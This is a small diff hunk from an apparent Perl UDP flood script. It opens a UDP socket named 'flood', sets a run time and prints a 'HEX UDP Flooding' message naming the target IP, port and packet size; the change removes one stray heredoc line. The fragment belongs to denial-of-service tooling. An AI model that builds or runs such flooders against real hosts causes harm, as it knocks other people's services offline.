@@ -18,7 +18,6 @@ $endtime = time() + ($time ? $time : 1000000);
  
 socket(flood, PF_INET, SOCK_DGRAM, 17);
  
-print <<EOTEXT;
 print "HEX UDP Flooding $ip " . ($port ? $port : "random") . " port with " .
   ($size ? "$size-byte" : "random size") . " packets" .
   ($time ? " for $time seconds" : "") . "\n";
